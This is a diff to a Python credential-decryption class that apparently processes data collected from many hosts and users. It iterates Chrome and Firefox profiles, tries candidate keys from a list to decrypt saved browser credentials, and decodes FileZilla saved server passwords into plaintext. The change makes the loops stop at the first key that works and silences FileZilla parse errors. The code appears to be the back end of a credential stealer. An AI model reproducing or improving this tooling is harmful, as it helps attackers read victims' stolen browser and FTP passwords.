@@ -15,6 +15,7 @@ class Decrypt:
     def Decryptor(self):
         SSID = []
         data = ''
+        interrupt = False
         for folders in os.listdir(self.folder):
             if os.path.isdir(f'{self.folder}/{folders}'):
                 path_host = self.folder + f'/{folders}/'
@@ -30,18 +31,31 @@ class Decrypt:
                             if os.path.isdir(f'{path_user}/Chrome/{i}'):
                                 for g in SSID:
                                     for k in self.book:
-                                        data += Chrome_decryptor(f'{path_user}/Chrome', i, g[1], k, g[0])
+                                        d = Chrome_decryptor(f'{path_user}/Chrome', i, g[1], k, g[0])
+                                        if d is not None:
+                                            interrupt = True
+                                            data += d
+                                            break
+                                    if interrupt:
+                                        interrupt = False
+                                        break
 
                         for i in os.listdir(f'{path_user}/FireFox'):
                             if os.path.isdir(f'{path_user}/FireFox/{i}'):
                                 for g in self.book:
-                                    data += Firefox_decryptor(g, f'{pathlib.Path().absolute()}/{path_user}/FireFox/{i}')
+                                    d = Firefox_decryptor(g, f'{pathlib.Path().absolute()}/{path_user}/FireFox/{i}')
+                                    if d is not None:
+                                        data += d
+                                        break
 
-                        filezilla_xml = ET.parse(f'{path_user}/FileZilla/recentservers.xml')
-                        root = filezilla_xml.getroot()
-                        data += f'\nFileZilla credentials\n{"*" * 50}\n'
-                        for i in root[0]:
-                            if i.tag == 'Server' and i[4].tag == 'User' and i[5].tag == 'Pass':
-                                data += f'Host IP: {i[0].text}\nPort: {i[1].text}\nLogin: {i[4].text}\nPassword: {b64decode(i[5].text).decode("UTF-8")}\n\n'
-                        data += f'{"*" * 50}\n'
+                        try:
+                            filezilla_xml = ET.parse(f'{path_user}/FileZilla/recentservers.xml')
+                            root = filezilla_xml.getroot()
+                            data += f'\nFileZilla credentials\n{"*" * 50}\n'
+                            for i in root[0]:
+                                if i.tag == 'Server' and i[4].tag == 'User' and i[5].tag == 'Pass':
+                                    data += f'Host IP: {i[0].text}\nPort: {i[1].text}\nLogin: {i[4].text}\nPassword: {b64decode(i[5].text).decode("UTF-8")}\n\n'
+                            data += f'{"*" * 50}\n'
+                        except:
+                            pass
         return data
